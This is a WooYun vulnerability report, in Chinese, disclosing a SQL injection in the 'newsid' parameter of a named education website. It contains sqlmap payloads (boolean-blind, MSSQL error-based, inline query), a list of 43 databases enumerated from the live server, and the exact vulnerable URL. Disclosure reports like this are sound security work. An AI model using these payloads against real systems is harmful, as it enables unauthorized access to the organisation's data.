wybug_title: 教育人生网高危注射漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-12-16：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-01-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注射 详细说明：  
GET parameter 'newsid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Place: GETParameter: newsid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: newsid=136985 AND 9820=9820    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: newsid=136985 AND 3075=CONVERT(INT,(CHAR(58) CHAR(122) CHAR(106) CHAR(102) CHAR(58) (SELECT (CASE WHEN (3075=3075) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(108) CHAR(111) CHAR(119) CHAR(58)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: newsid=(SELECT CHAR(58) CHAR(122) CHAR(106) CHAR(102) CHAR(58) (SELECT (CASE WHEN (3079=3079) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(108)CHAR(111) CHAR(119) CHAR(58))---
   漏洞证明：  
available databases [43]:[*] 400Tel[*] dbAuhs[*] dbFeiFan[*] dbfile[*] dbFuYuan[*] dbFuYuan2[*] dbJianZhang[*] DBslzx[*] DbUnion[*] dhucj[*] dnt31[*] donghua[*] donghua2[*] edubao[*] eduBM[*] eduKepu[*] edulifebbs[*] edulifeOA[*] eduonline[*] fuyuan[*] gApple[*] hesheng[*] information[*] kepu[*] master[*] Member[*] mobileSchool[*] model[*] msdb[*] newedulife[*] newedulife2[*] PilotWeb[*] SEMS[*] shangwai[*] shangwaiqingshaonian[*] shonline[*] t[*] tempdb[*] test[*] tongjite[*] URTracker[*] xinchangedu[*] xinchangedu_tz



http://www.edulife.com.cn/vipschool/finance365/news.aspx?newsid=136985
   修复方案：     版权声明：转载请注明来源 0x 80@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
